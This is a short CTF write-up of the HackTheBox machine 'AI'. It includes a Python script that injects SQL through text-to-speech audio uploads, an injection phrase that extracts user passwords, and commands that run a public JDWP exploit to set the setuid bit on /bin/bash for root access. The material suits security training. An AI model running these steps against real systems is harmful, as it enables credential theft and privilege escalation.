---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/XQXTCiWEjGk/0.jpg
layout: post
media_subpath: /assets/posts/2020-01-25-ai-hackthebox
tags:
- hackthebox
- java debugging
- linux
- sql injection
- voice
title: AI @ HackTheBox
---

AI is a 30 point machine on HackTheBox that involves SQL injection via speech and abusing an exposed java debugging port.

{% youtube XQXTCiWEjGk %}

## Notes

SQL injection helper:

```
#!/usr/bin/env python
import subprocess
import requests
import shutil
import json
import sys
import re

msg = sys.argv[1]

# text to speech
headers = {'Content-type' : 'application/x-www-form-urlencoded'}
url = 'https://ttsmp3.com/makemp3_new.php'
r = requests.post(url, data={'msg': msg, 'lang':'Joey','source':'ttsmp3'}, headers=headers)

# download result
url = json.loads(r.text)['URL']
r = requests.get(url, stream=True)
with open('tmp.mp3', 'wb') as f:
    shutil.copyfileobj(r.raw, f)

# convert
subprocess.call(['ffmpeg', '-i', 'tmp.mp3',
                   'tmp.wav'])

# upload & check result
url = 'http://ai.htb/ai.php'
files = {'fileToUpload': open('tmp.wav','rb')}
r = requests.post(url, files=files, data={'submit':'Process It!'})
print(r.text)
```

Use helper to get the users password:

```
python3 inject.py 'open single kwote. union select password from users comment database'
```

Exploit jdwp (with port forwarded to localhost):

```
searchsploit -x jdwp
searchsploit -m exploits/java/remote/46501.py
python 46501.py -t localhost -p 8000 --cmd "chmod u+s /bin/bash"
curl http://127.0.0.1:8005
/bin/bash -p
```